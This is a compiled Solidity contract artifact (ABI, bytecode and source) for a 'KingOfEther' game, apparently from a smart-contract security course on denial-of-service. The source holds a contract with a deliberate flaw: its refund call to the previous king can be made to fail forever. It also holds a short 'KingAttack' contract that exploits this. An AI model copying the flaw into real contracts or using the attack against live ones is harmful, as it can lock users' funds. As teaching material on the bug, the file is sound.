{
  "contractName": "KingOfEther",
  "abi": [
    {
      "inputs": [],
      "name": "balance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "king",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "claimThrone",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506102ec806100206000396000f3fe6080604052600436106100345760003560e01c806369deb7b714610039578063b69ef8a814610043578063cc181ca81461006e575b600080fd5b6100416100c5565b005b34801561004f57600080fd5b50610058610268565b6040518082815260200191505060405180910390f35b34801561007a57600080fd5b5061008361026e565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b600154341161011f576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260238152602001806102946023913960400191505060405180910390fd5b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660015460405180600001905060006040518083038185875af1925050503d80600081146101a2576040519150601f19603f3d011682016040523d82523d6000602084013e6101a7565b606091505b505090508061021e576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260148152602001807f4661696c656420746f2073656e6420457468657200000000000000000000000081525060200191505060405180910390fd5b34600181905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60015481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156fe4e65656420746f20706179206d6f726520746f206265636f6d6520746865206b696e67a2646970667358221220936795dc13084303581c9f9be42aff694ff20debc3e27cf54b517229955d1b6c64736f6c634300060a0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract KingOfEther {\n\n    address public king;\n    uint public balance;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, \"Need to pay more to become the king\");\n\n        (bool sent, ) = king.call{value: balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n}\n\ncontract KingAttack {\n    function attack(KingOfEther kingOfEther) public payable {\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n}",
  "sourcePath": "/home/dev/Desktop/Sol/other/Smart_contract_programmer/Security/contracts/DenialOfService.sol",
  "compiler": {
    "name": "solc",
    "version": "0.6.10+commit.00c0fcaf.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-11-12T06:44:41.698Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}